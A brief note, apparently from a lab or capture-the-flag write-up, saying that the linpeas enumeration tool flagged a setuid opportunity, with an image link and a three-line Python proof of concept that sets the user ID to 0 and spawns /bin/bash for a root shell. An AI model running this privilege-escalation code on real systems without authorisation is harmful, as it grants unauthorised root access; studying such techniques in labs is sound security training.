Notice that setuid was identified by linpeas
![image](https://github.com/user-attachments/assets/7c71f3bf-55ab-458c-86e5-480a08529df0)

POC to get priv-escalate

import os
os.setuid(0)
os.system("/bin/bash")
